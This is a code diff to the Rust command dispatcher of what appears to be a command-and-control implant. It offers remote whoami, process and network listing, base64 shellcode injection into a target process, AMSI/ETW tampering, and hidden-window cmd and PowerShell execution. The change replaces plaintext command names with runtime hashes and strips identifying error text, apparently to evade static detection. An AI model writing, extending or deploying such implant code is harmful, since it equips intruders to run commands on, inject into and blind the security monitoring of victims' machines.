@@ -63,28 +63,34 @@ fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
         return output;
     }
 
-    match command {
-        "whoami" if cfg!(feature = "cmd-whoami") => {
+    match link_common::cmd_hash_runtime(command) {
+        link_common::cmds::WHOAMI if cfg!(feature = "cmd-whoami") => {
             format!("{}\\{}", hostname(), username()).into()
         }
-        "info" if cfg!(feature = "cmd-info") => collect_system_info().into(),
-        "ps" if cfg!(feature = "cmd-ps") => list_processes_browser(),
-        "netstat" if cfg!(feature = "cmd-netstat") => list_network_connections().into(),
-        "integrity" if cfg!(feature = "cmd-integrity") => integrity_level().into(),
-        "inject" if cfg!(feature = "cmd-inject") => {
+        link_common::cmds::INFO if cfg!(feature = "cmd-info") => collect_system_info().into(),
+        link_common::cmds::PS if cfg!(feature = "cmd-ps") => list_processes_browser(),
+        link_common::cmds::NETSTAT if cfg!(feature = "cmd-netstat") => {
+            list_network_connections().into()
+        }
+        link_common::cmds::INTEGRITY if cfg!(feature = "cmd-integrity") => integrity_level().into(),
+        link_common::cmds::INJECT if cfg!(feature = "cmd-inject") => {
             let pid = link_common::extract_param(parameters, "pid");
             let sc = link_common::extract_param(parameters, "shellcode");
             inject_cmd(&format!("{} {}", pid, sc)).into()
         }
-        "amsi_etw" if cfg!(feature = "cmd-amsi-etw") => {
+        link_common::cmds::AMSI_ETW if cfg!(feature = "cmd-amsi-etw") => {
             crate::amsi_etw::amsi_etw_cmd(parameters).into()
         }
         // cmd and powershell are Windows-specific shell variants,
         // registered separately on the Go side (cmd.go, powershell.go).
-        "cmd" | "powershell" | "shell" if cfg!(feature = "cmd-shell") => {
+        c if (c == link_common::cmds::CMD
+            || c == link_common::cmds::POWERSHELL
+            || c == link_common::cmds::SHELL)
+            && cfg!(feature = "cmd-shell") =>
+        {
             let cmd = link_common::extract_param(parameters, "command");
             let cmd_str = if cmd.is_empty() { parameters } else { &cmd };
-            if command == "powershell" {
+            if c == link_common::cmds::POWERSHELL {
                 shell_exec(
                     "powershell.exe",
                     &["-noP", "-sta", "-w", "1", "-c", cmd_str],
@@ -94,7 +100,7 @@ fn dispatch(command: &str, parameters: &str) -> link_common::CommandOutput {
             }
             .into()
         }
-        _ => format!("[-] unknown command: {}", command).into(),
+        _ => link_common::CommandOutput::text("[-] unknown command".to_string()),
     }
 }
 
@@ -347,11 +353,11 @@ fn integrity_level() -> String {
 fn inject_cmd(args: &str) -> String {
     let (pid_str, b64) = link_common::split_first(args);
     if b64.is_empty() {
-        return "Usage: inject <pid> <base64_shellcode>".into();
+        return "missing arguments: <pid> <base64_shellcode>".into();
     }
     let pid: u32 = match pid_str.parse() {
         Ok(p) => p,
-        Err(_) => return "Usage: inject <pid> <base64_shellcode>".into(),
+        Err(_) => return "missing arguments: <pid> <base64_shellcode>".into(),
     };
     use base64::{engine::general_purpose, Engine};
     match general_purpose::STANDARD.decode(b64) {
